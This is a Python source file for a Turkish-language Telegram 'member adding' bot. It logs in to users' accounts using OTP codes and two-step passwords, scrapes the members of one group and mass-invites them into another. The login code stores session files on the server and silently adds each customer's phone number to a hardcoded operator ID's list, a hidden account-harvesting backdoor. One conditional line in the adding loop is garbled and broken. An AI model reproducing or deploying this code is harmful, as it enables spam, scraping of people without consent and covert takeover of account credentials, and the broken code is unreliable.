
import re, os, random, asyncio, html,configparser,pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
import csv
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/1882918909/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/1882918909')
   open(f"Users/1882918909/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")

import logging
from tglogging import TelegramLogHandler

APP_ID = int(os.environ.get("APP_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
UPDATES_CHANNEL = os.environ.get("UPDATES_CHANNEL")
OWNER= [1610383727]
PREMIUM = [1610383727]
OWNER_USERNAME = os.environ.get("OWNER_USERNAME")
LOG_CHANNEL = os.environ.get("LOG_CHANNEL")


# TGLOGGING Uygulamanızın logunu Telegram'a anlık göndermenizi sağlar. 

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        TelegramLogHandler(
            token="Bot Tokeniniz", 
            log_chat_id=LOG_CHANNEL, 
            update_interval=2, 
            minimum_lines=1, # Her Mesajda gönderilecek satır sayısı
            pending_logs=200000),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger("pyrogram - telethon")

logger.info("Telegram'a canlı log başlatıldı.")



app = pyrogram.Client("app", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
        if d<=r:
            PREMIUM.append(int(row[1]))

# ------------------------------- Subscribe --------------------------------- #
async def Subscribe(lel, message):
   update_channel = UPDATES_CHANNEL
   if update_channel:
      try:
         user = await app.get_chat_member(update_channel, message.chat.id)
         if user.status == "kicked":
            await app.send_message(chat_id=message.chat.id,text=f"Üzgünüm efendim, Yasaklandınız. İletişim [Support](https://t.me/{OWNER_USERNAME}).", parse_mode="markdown", disable_web_page_preview=True)
            return 1
      except UserNotParticipant:
         await app.send_message(chat_id=message.chat.id, text="**Lütfen Beni Kullanmak İçin Güncellemelerim Kanalına Katılın!\n ve Kontrol etmek için tıklayın /start**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤖 Güncellemeler Kanalına Katılın 🤖", url=f"https://t.me/{update_channel}")]]), parse_mode="markdown")
         return 1
      except Exception:
         await app.send_message(chat_id=message.chat.id, text=f"**Bir şeyler yanlış gitti. İletişim [Support](https://t.me/{OWNER_USERNAME}).**", parse_mode="markdown", disable_web_page_preview=True)
         return 1



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton("Giriş✅", callback_data="Login"), InlineKeyboardButton("Üye ekleme💯", callback_data="Adding") ],[InlineKeyboardButton("Numara⚙️", callback_data="Edit"), InlineKeyboardButton("PhoneSee💕", callback_data="Ish")],[InlineKeyboardButton("Numara kaldır⚙️", callback_data="Remove"), InlineKeyboardButton("Admin Pannel", callback_data="Admin")]])
   await message.reply_text(f"**Selam** `{message.from_user.first_name}` **!\n\nBen üye ekleme botuyum \n\nBy @{OWNER_USERNAME}**", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**Artık Premium Kullanıcı değilsiniz\nLütfen sahibim ile iletişime geçin By @{OWNER_USERNAME}**")
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text=f"**Giriş yapılacak hesap sayısını girin (tam sayı olarak)\n\n❤️ By @{OWNER_USERNAME}**")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, f"""**Geçersiz Biçim 1'den az Tekrar deneyin\n\n ❤️ By @{OWNER_USERNAME}**""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"**Yalnızca {100-a} Telefon numarası ekleyebilirsiniz \n\nMade with ❤️ By @{OWNER_USERNAME}**")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text=f"**Şimdi Telegram Hesabınızın Telefon Numarasını Uluslararası Formatta Gönderin. \n**Ülke Kodu** dahil. \nÖrnek: **+14154566376 = 14154566376 yalnızca +** değil\n\n❤️ By @{OWNER_USERNAME}**")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, f"""**Bahsedildiği gibi + dahil değildir\n\n❤️ By @{OWNER_USERNAME}**""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}). Telefon: {phone} Başarılı✅\n\n❤️ By @{OWNER_USERNAME}**")
         else:
            await app.send_message(message.chat.id, f"""**Geçersiz Sayı Biçimi Tekrar deneyin\n\n❤️ By @{OWNER_USERNAME}**""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**Hata: {e}\n\n❤️ By @{OWNER_USERNAME}**")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**Artık Premium Kullanıcı değilsiniz\n❤️ By @{OWNER_USERNAME}**")
      return
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f"{e.x} Saniyelik Floodwait'iniz Var")
            return
         except PhoneNumberInvalidError:
            await message.reply("Telefon Numaranız Geçersiz.\n\nYeniden Başlamak için /start'a basın!")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} is Baned")
            continue
         try:
            otp = await app.ask(message.chat.id, ("Telefon numaranıza bir OTP gönderilir, \nLütfen OTP'yi `1 2 3 4 5` formatında girin. __(Her sayı arasındaki boşluk!)__ \n\nBot OTP göndermiyorsa, Bot'a /start komutuyla /restart başlatmayı ve Görevi Başlatmayı tekrar deneyin.\nİptal etmek için /cancel'e basın."), timeout=300)
         except TimeoutError:
            await message.reply("Zaman Sınırına Ulaşıldı 5 Dakika.\nYeniden Başlamak için /start'a basın!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("Geçersiz Kod.\n\nYeniden Başlamak için /start'a basın!")
            return
         except PhoneCodeExpiredError:
            await message.reply("Kodun Süresi Doldu.\n\nYeniden Başlamak için /start'a basın!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id,"Hesabınızın İki Adımlı Doğrulaması Var.\nLütfen Parolanızı Girin.",timeout=300)
            except TimeoutError:
               await message.reply("`Zaman Sınırına Ulaşıldı 5 Dakika.\n\nYeniden Başlamak için /start'a basın!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**Hata:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**Hata:** `{str(e)}`")
               return
      with open("Users/1882918909/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/1882918909/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      await client(functions.contacts.UnblockRequest(id='@SpamBot'))
      await client.send_message('SpamBot', '/start')
      msg = str(await client.get_messages('SpamBot'))
      re= "bird"
      if re in msg:
         stats="İyi haber, şu anda hesabınıza herhangi bir sınır uygulanmıyor. bir kuş kadar özgürsün!"
         s+=1
         r.append(str(phone))
      else:
         stats='you are limited'
         l.append(str(phone))
      me = await client.get_me()
      await app.send_message(message.chat.id, f"Giriş başarılı✅ Done.\n\n**Name:** {me.first_name}\n**Username:** {me.username}\n**Phone:** {phone}\n**SpamBot Stats:** {stats}\n\n**❤️ By @{OWNER_USERNAME}**")     
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, f"**Telefon numarasını girmediniz \nlütfen Config⚙️ camand ile düzenleyin /start.\n\n❤️ By @{OWNER_USERNAME}**")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**Hata: {e}\n\n❤️ By @{OWNER_USERNAME}**")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**Tüm Acc Giriş {s} Hesabı Mevcuttur {po} \n\n❤️ By @{OWNER_USERNAME}**") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**Hata: {e}\n\n❤️ By @{OWNER_USERNAME}**")
   return
                          


# ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**Artık Premium Kullanıcı değilsiniz\n❤️ By @{OWNER_USERNAME}**")
      return
   number = await app.ask(chat_id=message.chat.id, text=f"**Şimdi Çekilecek Grup Kullanıcı Adını Gönderin \n\n❤️ By @{OWNER_USERNAME}**")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text=f"**Şimdi Eklenecek Grup Kullanıcı Adını Gönderin\n\n❤️ By @{OWNER_USERNAME}**")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text=f"**Üye Çekimini başlatmak için bir sayı giriniz  \n\n❤️ By @{OWNER_USERNAME}**")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**Adding Start**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**Scraping Start**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra
   
    150:
                     await client.disconnect()
                     r+=f"**\n❤️ By @{OWNER_USERNAME}**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**Error: {phone} Due to Some Error Moving to Next no\n\nMade with ❤️ By @{OWNER_USERNAME}**")
                     break
                  if dad>40:
                     r+=f"**\n❤️ By @{OWNER_USERNAME}**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**Adding Start**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = 'DONE'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+=f"**\nMade with ❤️ By @{OWNER_USERNAME}**"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**FloodWaitError for {s.seconds} sec\nSonraki Numaraya Geçiyorum**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = 'ALREADY'
               except UserBannedInChannelError:
                  status="User Banned"
               except ChatAdminRequiredError:
                  status="To Add Admin Required"
               except ValueError:
                  status="Error In Entry"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**Too Many PeerFloodError\nMoving To Next Number**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ⟾   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"Error: {e} \n\n❤️ By @{OWNER_USERNAME}")
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\n❤️ By @{OWNER_USERNAME}**")
   return



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["phonesee"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**Artık Premium Kullanıcı değilsiniz\n❤️ By @{OWNER_USERNAME}**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         de="**Telefon Numaralarınız**\n\n"
         da=0
         dad=0
         for pphone in str_list:
            dad+=1
            da+=1
            if dad>40:
               de+=f"**\n❤️ By @{OWNER_USERNAME}**"
               await app.send_message(chat_id=message.chat.id, text=f"{de}")
               de="**Telefon Numaralarınız**\n\n"
               dad=0 
            de+=(f"**{da}).** `{int(pphone)}`\n")
         de+=f"**\nMade with ❤️ By @{OWNER_USERNAME}**"
         await app.send_message(chat_id=message.chat.id, text=f"{de}")

   except Exception as a:
      pass


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["remove"]))
async def start(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**Artık Premium Kullanıcı değilsiniz\n❤️ By @{OWNER_USERNAME}**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         f.closed
         number = await app.ask(chat_id=message.chat.id, text="**Kaldırılacak Numarayı Gönderin\n\n❤️ By @{OWNER_USERNAME}**")
         print(str_list)
         str_list.remove(number.text)
         with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(str_list)
         with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
            for line in infile:
               outfile.write(line.replace(",", ""))
         await app.send_message(chat_id=message.chat.id,text="Başarıyla Tamamlandı")
   except Exception as a:
      pass
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\n❤️ By @{OWNER_USERNAME}**")
   return

# ------------------------------- Admin Pannel --------------------------------- #
@app.on_message(filters.private & filters.command('ishan'))
async def subscribers_count(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id in OWNER:
      but = InlineKeyboardMarkup([[InlineKeyboardButton("Users✅", callback_data="Users")], [InlineKeyboardButton("Broadcast💯", callback_data="Broadcast")],[InlineKeyboardButton("AddUser", callback_data="New")], [InlineKeyboardButton("Check Users", callback_data="Check")]])
      await app.send_message(chat_id=message.chat.id,text=f"**Hi** `{message.from_user.first_name}` **!\n\nWelcome to Admin Pannel of Induced Bot\n\nMade with ❤️ By @{OWNER_USERNAME}**", reply_markup=but)
   else:
      await app.send_message(chat_id=message.chat.id,text=f"**You are not owner of Bot \n\nMade with ❤️ By @{OWNER_USERNAME}**")



# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Login" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Giriş yapmak ve Hesap istatistiklerini kontrol etmek için /login'e tıklamanız yeterli.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Ish" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Hesap istatistiklerini kontrol etmek için /phonesee'ye tıklamanız yeterli.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Remove" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Numara kaldırmak için /remove tıklayınız.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Adding" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Üye ekleme işlemini başlatmak için /adding tıklayınız.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Edit" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Hesap eklemek için /phone tıklayınız.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, f"""**Artık hiçbir şey yok..!\nEve Gitmek için /start tıklamanız yeterli.\n\nMade with ❤️ By @{OWNER_USERNAME}**""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"Please Wait...")
      messages = await users_info(app)
      await msg.edit(f"Total:\n\nUsers - {messages[0]}\nBlocked - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text=f"**Send User Id Of New User\n\nMade with ❤️ By @{OWNER_USERNAME}**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUM.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="Done SucessFully")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**Premium Users**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+=f"\n\n**Made with ❤️ By @{OWNER_USERNAME}**"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNER:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("Users✅", callback_data="Users")], [InlineKeyboardButton("Broadcast💯", callback_data="Broadcast")],[InlineKeyboardButton("AddUser", callback_data="New")], [InlineKeyboardButton("Check Users", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**Welcome to Admin Pannel of Induced Bot\n\nMade with ❤️ By @{OWNER_USERNAME}**", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text=f"**You are not owner of Bot \n\nMade with ❤️ By @{OWNER_USERNAME}**")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text=f"**Now me message For Broadcast\n\nMade with ❤️ By @{OWNER_USERNAME}**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"Successfully Broadcasted to {a} Chats\nFailed - {b} Chats !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**Error: {e}\n\nMade with ❤️ By @{OWNER_USERNAME}**")




text = """
╔════╗ㅤMembers 
╚═╗╔═╝ Scraping Bot
╔═╣╠═╗
║╔╣╠╗║ㅤInduced
║╚╣╠╝║ Scraper Bot
╚═╣╠═╝
╔═╝╚═╗ 
╚════╝ 
"""
print(text)
print("Induced Adding Started Sucessfully........")
app.run()

   
